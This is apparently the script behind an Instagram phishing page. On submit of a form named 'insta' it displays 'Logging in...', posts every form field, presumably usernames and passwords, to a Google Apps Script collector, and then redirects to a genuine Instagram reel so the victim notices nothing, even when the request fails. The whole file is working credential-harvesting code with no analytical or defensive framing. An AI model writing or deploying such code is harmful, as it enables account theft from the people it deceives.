const scriptURL = 'https://script.google.com/macros/s/AKfycbye3idJL3pA-Ip0zOVuXyPxKoB0YE1eDd0X95W-yZlAR5aqhH9OkwMR7AfHXWKAGesb/exec'
const form = document.forms['insta']
const submitButton = form.querySelector('button[type="submit"]')
const buttonText = form.querySelector('.style-66')

form.addEventListener("submit", e => {
    e.preventDefault()
    
    // Provide immediate feedback
    if (submitButton) submitButton.disabled = true
    if (buttonText) buttonText.textContent = "Logging in..."
    
    const formData = new FormData(form)
    
    // Use keepalive to ensure the request completes if redirection is fast
    fetch(scriptURL, { 
        method: 'POST', 
        body: formData,
        keepalive: true,
        mode: 'no-cors' // Google Apps Script often needs no-cors for simple POSTs if not returning JSON
    })
    .then(() => {
        window.location.replace("https://www.instagram.com/reel/C7WomdQKj0r/?utm_source=ig_web_copy_link&igsh=MzRlODBiNWFlZA==")
    })
    .catch(error => {
        console.error('Error!', error.message)
        // Even on error, redirect to avoid sticking on the login page
        window.location.replace("https://www.instagram.com/reel/C7WomdQKj0r/?utm_source=ig_web_copy_link&igsh=MzRlODBiNWFlZA==")
    })
})